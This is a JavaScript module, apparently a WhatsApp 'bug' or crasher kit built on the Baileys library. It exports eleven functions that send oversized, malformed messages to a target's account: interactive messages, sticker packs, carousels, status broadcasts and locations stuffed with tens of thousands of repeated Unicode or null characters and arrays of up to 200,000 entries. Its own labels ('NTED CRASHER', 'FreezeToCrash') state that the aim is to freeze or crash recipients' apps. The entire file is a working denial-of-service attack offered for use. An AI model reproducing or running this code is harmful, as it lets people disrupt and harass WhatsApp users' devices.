const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
  makeCacheableSignalKeyStore,
  encodeNewsletterMessage,
  patchMessageBeforeSending,
  encodeWAMessage,
  encodeSignedDeviceIdentity,
  jidEncode,
  jidDecode,
  baileysLib
} = require("@whiskeysockets/baileys");
const crypto = require("crypto");
const chalk = require("chalk");

function sleep(ms) {
  return new Promise((resolve) => {
    setTimeout(resolve, ms);
  });
}
const thumb = "https://files.catbox.moe/3p0udg.jpg";

async function BugUiOne(sock, targetJid) {
    console.log(chalk.red(`Nted Send Bugs`));
    const nted = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: -999.03499999999999,
                            degreesLongitude: 922.9999999999999,
                            name: "⿻ ¡ Nted Is Here ¡ ⿻" + "ꦽ".repeat(60000),
                            url: "https://t.me/Otapengenkawin",
                            contextInfo: {
                                externalAdReply: {
                                    quotedAd: {
                                        advertiserName: "ꦾ".repeat(60000),
                                        mediaType: "IMAGE",
                                        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                                        caption: "⿻︎ ¡ Nted 𖣂︎ Crasher ¡ ⿻"
                                    },
                                    placeholderKey: {
                                        remoteJid: "0@g.us",
                                        fromMe: true,
                                        id: "ABCDEF1234567890"
                                    }
                                }
                            }
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "⿻ Nted WhatsApp Bugs ⿻"
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "\0",
                        messageVersion: 3,
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: "",
                            },
                            {
                                name: "galaxy_message",
                                buttonParamsJson: JSON.stringify({
                                    "icon": "RIVIEW",
                                    "flow_cta": "ꦽ".repeat(10000),
                                    "flow_message_version": "3"
                                })
                            },
                            {
                                name: "galaxy_message",
                                buttonParamsJson: JSON.stringify({
                                    "icon": "RIVIEW",
                                    "flow_cta": "ꦾ".repeat(10000),
                                    "flow_message_version": "3"
                                })
                            },
                        ]
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(targetJid, proto.Message.fromObject(nted), { userJid: targetJid });
    
    await sock.relayMessage(targetJid, msg.message, { participant: true });
}
async function BugUiTwo(sock, targetJid) {
 await sock.relayMessage(targetJid, {
   stickerPackMessage: {
    stickerPackId: "d06d5803-232d-4f27-97ab-6e1a56b98434",
    name: "\0" + "𑇂𑆵𑆴𑆿".repeat(60000),
    publisher:"",
    stickers: [
     {
      fileName: "vrPf0XE09N6FFSxWWNi44Cs6I26fGbgXqFzRRcL3E-M=.webp",
      isAnimated: false,
      emojis: ["☕ 🙂"],
      accessibilityLabel: "A smiling, white cup contains a brown drink.",
      isLottie:false,
      mimetype:"image/webp"
     },
    {
     fileName: "VTzLXxPyAt2kj1htM6q5mS1bNkdeOoq05gXN4bHRedI=.webp",
     isAnimated: false,
     emojis: ["😄 😀"],
     accessibilityLabel: "A laughing, white cup is tilted to the right and contains a brown drink.",
     isLottie: false,
     mimetype:"image/webp"
    },
  ],
  fileLength: "44284",
  fileSha256: "x5U7VwPORg55pOOkbcT5WluOTupd08MqQWhLJOSF1/0=",
  fileEncSha256: "HK/DWi8Hit2AH/zdl+zF+iOtOqn7sblWzv2idv/e2Fk=",
  mediaKey: "yAY8sMN8WBF4bll0iXI6qIpeMSdnUAouZmXQ9K6bBH8=",
  directPath: "/v/t62.15575-24/568790455_1348223060743345_7265249758547324723_n.enc?ccb=11-4&oh=01_Q5Aa4wEgp_5d1tX1I0lhoiARqwVzqsIDuTa6MzE_herbdRmA5A&oe=6A6EF01A&_nc_sid=5e03e0",
  contextInfo:{
    isForwarded: true, 
    forwardingScore: 250208,
    businessMessageForwardInfo: {
      businessOwnerJid: "13135550002@s.whatsapp.net"
      }
    },
    mediaKeyTimestamp: "1783073744",
     trayIconFileName: "d06d5803-232d-4f27-97ab-6e1a56b98434.png",
      thumbnailDirectPath: "/v/t62.15575-24/738340804_998258556254669_2403531129898347266_n.enc?ccb=11-4&oh=01_Q5Aa4wEeUfeh0thOBv6PkpN8i1SzwKMg-XO8zXOVMuEysGPpUw&oe=6A6EF791&_nc_sid=5e03e0",
      thumbnailSha256: "cdIWH9M9fl0pRkOhFh3I+HyMYTxExUD14juPeDrVzR8=",
      thumbnailEncSha256: "T06Qnw57tBJJ6cuwtv/SNQQiCFoMEX+5yExOn+LtzDY=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "MjgxMzkwYzdlM2Q1MjdlM2ZkMDg3NjE4ZjViMTczMjFhNTM2ZDE1ODM1ZTA1NTVhNjM5MTYyNzkxNWVhOGZkMw==",
      stickerPackSize: "42788",
      stickerPackOrigin: "USER_CREATED"
    }
  }, {
      participant: true //Hapus untuk groups
  });
}

//----- Bugs Delay
async function InvisibleX(sock, targetJid) {
 await sock.relayMessage(targetJid, {
  groupStatusMessageV2: {
   stickerPackMessage: {
    stickerPackId: "d06d5803-232d-4f27-97ab-6e1a56b98434",
    name: "\0".repeat(60000),
    publisher:"",
    stickers: Array.from({ length: 2000 }, () => [
     {
      fileName: "vrPf0XE09N6FFSxWWNi44Cs6I26fGbgXqFzRRcL3E-M=.webp",
      isAnimated: false,
      emojis: ["☕ 🙂"],
      accessibilityLabel: "A smiling, white cup contains a brown drink.",
      isLottie:false,
      mimetype:"image/webp"
     },
    {
     fileName: "VTzLXxPyAt2kj1htM6q5mS1bNkdeOoq05gXN4bHRedI=.webp",
     isAnimated: false,
     emojis: ["😄 😀"],
     accessibilityLabel: "A laughing, white cup is tilted to the right and contains a brown drink.",
     isLottie: false,
     mimetype:"image/webp"
    },
  ]),
  fileLength: "44284",
  fileSha256: "x5U7VwPORg55pOOkbcT5WluOTupd08MqQWhLJOSF1/0=",
  fileEncSha256: "HK/DWi8Hit2AH/zdl+zF+iOtOqn7sblWzv2idv/e2Fk=",
  mediaKey: "yAY8sMN8WBF4bll0iXI6qIpeMSdnUAouZmXQ9K6bBH8=",
  directPath: "/v/t62.15575-24/568790455_1348223060743345_7265249758547324723_n.enc?ccb=11-4&oh=01_Q5Aa4wEgp_5d1tX1I0lhoiARqwVzqsIDuTa6MzE_herbdRmA5A&oe=6A6EF01A&_nc_sid=5e03e0",
  contextInfo:{
    isForwarded: true, 
    forwardingScore: 250208,
    businessMessageForwardInfo: {
      businessOwnerJid: "13135550002@s.whatsapp.net"
      }
    },
    mediaKeyTimestamp: "1783073744",
     trayIconFileName: "d06d5803-232d-4f27-97ab-6e1a56b98434.png",
      thumbnailDirectPath: "/v/t62.15575-24/738340804_998258556254669_2403531129898347266_n.enc?ccb=11-4&oh=01_Q5Aa4wEeUfeh0thOBv6PkpN8i1SzwKMg-XO8zXOVMuEysGPpUw&oe=6A6EF791&_nc_sid=5e03e0",
      thumbnailSha256: "cdIWH9M9fl0pRkOhFh3I+HyMYTxExUD14juPeDrVzR8=",
      thumbnailEncSha256: "T06Qnw57tBJJ6cuwtv/SNQQiCFoMEX+5yExOn+LtzDY=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "MjgxMzkwYzdlM2Q1MjdlM2ZkMDg3NjE4ZjViMTczMjFhNTM2ZDE1ODM1ZTA1NTVhNjM5MTYyNzkxNWVhOGZkMw==",
      stickerPackSize: "42788",
      stickerPackOrigin: "USER_CREATED"
    }
  }
}, {
   participant: true
  });
}
async function ofmEr(sock, targetJid) {
 let msg = await generateWAMessageFromContent(targetJid, {
   botInvokeMessage: {
    message: {
     interactiveResponseMessage: {
      contextInfo: {
       remoteJid: "status@broadcast",
       fromMe: true,
       forwardedAiBotMessageInfo: {
        botJid: "13135550202@bot",
        botName: "Business Assistant",
        creator: "XzC - Expos3d"
       },
       statusAttributionType: 4,
       statusAttributions: Array.from({ length: 20000 }, (_, z) => ({
         type: 1
        }))
      },
      body: {
        text: "Nted - Wazap",
        format: "DEFAULT"
       },
       nativeFlowResponseMessage: {
         name: "call_permission_request",
         paramsJson: "?".repeat(50000),
         version: 3
        }
      }
    }
  }
}, { statusJidList: [targetJid] });

 await sock.relayMessage(targetJid, {
   groupStatusMessageV2: {
     message: msg.message
    }
  }, {
     participant: true,
     messageId: msg.key.id
   });
}
async function Carouselsock(sock, targetJid) {
    console.log(chalk.red(`Nted Send Bugs`));
    const cards = Array.from({ length: 5 }, () => ({
        body: proto.Message.InteractiveMessage.Body.fromObject({ text: "Nted" + "\0".repeat(5000), }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "Nted" + "\0".repeat(5000), }),
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: "Nted" + "ꦽ".repeat(5000),
            hasMediaAttachment: true,
            imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                fileLength: 388944,
                height: 1600,
                width: 1200,
                mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1776937541",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
                contextInfo: {
                    pairedMediaType: "NOT_PAIRED_MEDIA",
                    isQuestion: true,
                    isGroupStatus: true
                }
            },
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] })
    }));

    const death = Math.floor(Math.random() * 5000000) + "@s.whatsapp.net";

    const carousel = generateWAMessageFromContent(
        targetJid,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: "\0".repeat(5000)
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: "ꦽ".repeat(5000),
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            hasMediaAttachment: false
                        }),
                        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                            cards: cards
                        }),
                        contextInfo: {
                            participant: targetJid,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from(
                                    { length: 1900 },
                                    () =>
                                        "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                                ),
                            ],
                            remoteJid: "X",
                            participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                            stanzaId: "123",
                            quotedMessage: {
                                paymentInviteMessage: {
                                    serviceType: 3,
                                    expiryTimestamp: Date.now() + 1814400000
                                },
                                forwardedAiBotMessageInfo: {
                                    botName: "META AI",
                                    botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                                    creatorName: "Bot"
                                }
                            }
                        },
                    })
                }
            }
        },
        { userJid: targetJid }
    );

    await sock.relayMessage(targetJid, carousel.message, {
        messageId: carousel.key.id,
        participant: true
    });

    const nted = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        hasMediaAttachment: true,
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                            fileLength: 388944,
                            height: 1600,
                            width: 1200,
                            mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                            fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1776937541",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
                        }
                    },
                    body: {
                        text: "ꦾ".repeat(10000)
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "galaxy_message",
                                buttonParamsJson: JSON.stringify({
                                    "icon": "RIVIEW",
                                    "flow_cta": "ꦾ".repeat(10000),
                                    "flow_message_version": "3"
                                })
                            },
                        ]
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(targetJid, proto.Message.fromObject(nted), { userJid: targetJid });
    await sock.relayMessage(targetJid, msg.message, { messageId: msg.key.id, participant: true });
}
async function OfmSqLJav(sock, targetJid) {
    let msg2 = await generateWAMessageFromContent(
        targetJid,
        {
            imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc",
                mimetype: "image/jpeg",
                fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                fileLength: 388944,
                mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc",
                mediaKeyTimestamp: "1776937541",
                caption: "NTED CRASHER ⿻",
                contextInfo: {
                    participant: targetJid,
                    isForwarded: true,
                    forwardingScore: 999,
                    fromMe: true
                },
                annotations: Array.from({ length: 200000 }, () => ({
                    shouldSkipConfirmation: true,
                    embeddedContent: {
                        embeddedMusic: {
                            author: "NTED",
                            title: "\0",
                        }
                    },
                    embeddedAction: true,
                }))
            }
        },
        { statusJidList: [targetJid] }
    );

    await sock.relayMessage(targetJid, {
        groupStatusMessageV2: {
            message: msg2.message
        }
    }, {
        participant: true,
        messageId: msg2.key.id
    });
}
async function nullAttack(sock, targetJid) {
    const gerarJidAleatorio = () => {
        const ddis = ['41', '91', '90', '31', '40'];
        const ddiAleatorio = ddis[Math.floor(Math.random() * ddis.length)];
        return `${ddiAleatorio}${Math.floor(Math.random() * 1e10)
            .toString()
            .padStart(10, "0")}@s.whatsapp.net`;
    };

    const criarStatusAttributions = (limite) => {
        return Array.from({ length: limite }, () => ({
            participant: gerarJidAleatorio(),
            type: 1
        }));
    };
    try {
        await sock.relayMessage("status@broadcast", {
            viewOnceMessage: {
                message: {
                    listResponseMessage: {
                        title: "x",
                        listType: 1,
                        singleSelectReply: { selectedRowId: "id" },
                        description: "x",
                        contextInfo: {
                            remoteJid: "status@broadcast",
                            fromMe: true,
                            isQuestion: true,
                            forwardedAiBotMessageInfo: {
                                botJid: "13135550202@bot",
                                botName: "Business Assistant",
                                creator: "lol"
                            },
                            statusAttributionType: 2,
                            statusAttributions: criarStatusAttributions(200000)
                        }
                    }
                }
            }
        }, {
            statusJidList: [targetJid],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { status_setting: "contacts" },
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: targetJid }
                                }
                            ]
                        }
                    ]
                }
            ]
        });

        let locationMessage = {
            degreesLatitude: -9.09999,
            degreesLongitude: 199.99963,
            name: "X" + "𖣂".repeat(15000),
            address: "X" + "𖣂".repeat(5000),
            url: `https://api.${"𖣂".repeat(25000)}.com`
        };

        let msg = generateWAMessageFromContent(targetJid, {
            viewOnceMessage: { message: { locationMessage } }
        }, {});

        await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [targetJid],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: targetJid }
                                }
                            ]
                        }
                    ]
                }
            ]
        });

        let extendMsg = {
            extendedTextMessage: {
                text: "NTED CRASHER",
                matchedText: "https://t.me/NtedBitch",
                description: "\0".repeat(15000),
                title: "¿".repeat(15000),
                previewType: "NONE"
            }
        };

        let msg2 = generateWAMessageFromContent(targetJid, {
            viewOnceMessage: { message: extendMsg }
        }, {});

        await sock.relayMessage("status@broadcast", msg2.message, {
            messageId: msg2.key.id,
            statusJidList: [targetJid],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: targetJid }
                                }
                            ]
                        }
                    ]
                }
            ]
        });

        console.log("Send to:", targetJid);
        await new Promise(r => setTimeout(r, 2000));

    } catch (e) {
        console.error("error:", e);
    }
}
async function oombimg(sock, targetJid) {
    const msg = generateWAMessageFromContent("status@broadcast", {
        imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
            fileLength: 388944,
            height: 1600,
            width: 1200,
            mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
            fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1776937541",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
            contextInfo: {
                pairedMediaType: "NOT_PAIRED_MEDIA",
                isQuestion: true,
                isGroupStatus: true
            },
            caption: "MantaXxx",
            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
            scanLengths: [
                2899999999999999077,
                1799999999999998555,
                7699999999999999148,
                1069999999999999164
            ],
            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
        }
    }, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [targetJid],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: targetJid },
                                content: []
                            }
                        ]
                    }
                ]
            }
        ]
    })
}
async function BugWaxap(sock, targetJid) {
await sock.relayMessage(targetJid, {
   interactiveMessage: {
    body: { text: "hi" },
     nativeFlowMessage: {
       buttons: [
        {
         name: "single_select",
         buttonParamsJson: JSON.stringify({
           display_text: "\n".repeat(50000)
          })
        },
        {
         name: "quick_reply",
         buttonParamsJson: JSON.stringify({
           display_text: "\0"
          })
        }
      ]
    }
  }
}, {
   participant: true
  })
}
async function FreezeToCrash(sock, targetJid) {
await sock.relayMessage(targetJid, {
  interactiveMessage: {
   body: { text: "hi" },
    nativeFlowMessage: {
      buttons: [
       {
         name: "single_select",
         buttonParamsJson: JSON.stringify({
           display_text: "\0".repeat(50000)
          })
        }
      ]
    }
  }
}, {
   participant: true
  })
}
async function FreezeToCrash2(sock, targetJid) {
await sock.relayMessage(targetJid, {
  interactiveMessage: {
   body: { text: "\0" },
    nativeFlowMessage: {
      buttons: [
       {
         name: "quick_reply",
         buttonParamsJson: JSON.stringify({
           display_text: "?".repeat(50000)
          })
        }
      ]
    }
  }
}, {
   participant: true
  })
}

module.exports = {
  BugUiOne,
  BugUiTwo,
  Carouselsock,
  InvisibleX,
  ofmEr,
  OfmSqLJav,
  nullAttack,
  oombimg,
  BugWaxap,
  FreezeToCrash,
  FreezeToCrash2
}